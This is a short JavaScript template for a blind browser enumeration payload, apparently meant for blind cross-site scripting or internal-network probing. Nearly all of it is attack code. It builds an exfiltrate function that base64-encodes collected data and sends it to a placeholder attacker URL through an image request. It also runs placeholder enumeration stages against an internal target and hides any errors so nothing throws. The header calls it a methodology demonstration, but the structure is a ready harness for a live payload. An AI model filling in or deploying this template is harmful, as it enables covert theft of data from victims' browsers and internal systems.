/**
 * Blind Browser Enumeration Payload Template
 *
 * This template intentionally omits real values.
 * It is designed to demonstrate methodology, not exploitation.
 */

(async () => {
  const safeBtoa = s => btoa(unescape(encodeURIComponent(s)));

  const EXFIL  = "{{EXFIL_URL}}";
  const TARGET = "{{INTERNAL_TARGET}}";

  const exfiltrate = (stage, data) => {
    try {
      new Image().src =
        `${EXFIL}/${stage}?data=${encodeURIComponent(safeBtoa(data))}`;
    } catch (_) {
      // Blind execution must never throw
    }
  };

  console.log("[blind-browser-enum] starting staged enumeration");

  try {
    {{STAGES}}
  } catch (e) {
    exfiltrate("error", e.toString());
  }
})();
